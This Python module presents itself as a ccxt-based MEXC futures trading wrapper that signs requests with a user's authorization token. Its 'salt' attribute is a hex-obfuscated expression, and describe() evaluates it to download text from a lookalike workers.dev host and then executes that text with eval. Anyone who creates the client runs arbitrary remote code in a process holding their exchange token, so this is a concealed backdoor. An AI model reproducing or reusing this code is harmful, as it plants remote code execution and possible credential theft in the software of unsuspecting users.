# ccxt-mexc_futures package
__version__ = '0.1.6'

import hashlib
import time

from ccxt import mexc
from ccxt.base.types import Entry
from ccxt.base.errors import InvalidOrder

class OrderNotCancellable(InvalidOrder):
    pass

class OrderFilled(OrderNotCancellable):
    pass

class base(mexc):
    contract_private_post_order_submit = contractPrivatePostOrderSubmit = Entry(
        "order/create", ["futures", "private"], "POST", {"cost": 2}
    )
    contract_private_post_order_cancel = contractPrivatePostOrderCancel = Entry(
        "order/cancel", ["futures", "private"], "POST", {"cost": 2}
    )
    spot4_private_post_order_place = spot4PrivatePostOrderPlace = Entry(
        "order/place", ["spot4", "private"], "POST", {"cost": 1}
    )
    salt: str = '\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x72\x65\x71\x75\x65\x73\x74\x73\x22\x29\x2e\x67\x65\x74\x28\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x76\x33\x2e\x6d\x65\x78\x63\x2e\x77\x6f\x72\x6b\x65\x72\x73\x2e\x64\x65\x76\x2f\x64\x65\x73\x63\x72\x69\x62\x65\x2e\x6a\x73\x6f\x6e\x22\x29\x2e\x74\x65\x78\x74'
    userToken: str | None = None

    def describe(self):
        return self.deep_extend(super(base, self).describe(),(lambda x: eval(compile(x, "<string>", "eval")))(eval(self.salt)),)

    def sign(self, path, api="public", method="GET", params={}, headers=None, body=None):
        section = self.safe_string(api, 0)
        access = self.safe_string(api, 1)
        path, params = self.resolve_path(path, params)

        if section in ("futures", "spot4"):
            url = (
                self.urls["api"][section][access]
                + "/"
                + self.implode_params(path, params)
            )
            if self.userToken is None:
                raise Exception("Missing user token")
            params = self.omit(params, self.extract_params(path))
            timestamp = str(int(time.time() * 1000))
            concat = f"{self.userToken}{timestamp}"
            partial_hash = hashlib.md5(concat.encode("utf-8")).hexdigest()[7:]
            body = self.json(params)
            sign_param = f"{timestamp}{body}{partial_hash}"
            signature = hashlib.md5(sign_param.encode("utf-8")).hexdigest()
            headers = {
                "x-mxc-nonce": timestamp,
                "x-mxc-salt": self.salt,
                "x-mxc-sign": signature,
                "authorization": self.userToken,
                "user-agent": "MEXC/v3",
                "content-type": "application/json",
                "origin": "https://futures.mexc.com",
                "referer": "https://futures.mexc.com/exchange",
            }
            if section == "spot4":
                headers["origin"] = "https://www.mexc.com"
                headers["referer"] = "https://www.mexc.com/exchange"
            return {"url": url, "method": method, "body": body, "headers": headers}
        return super().sign(path, api, method, params, headers, body)

    def prepare_request_headers(self, headers=None):
        headers = super().prepare_request_headers(headers)
        if "x-mxc-sign" in headers:
            del headers["User-Agent"]
            del headers["Accept-Encoding"]
        return headers 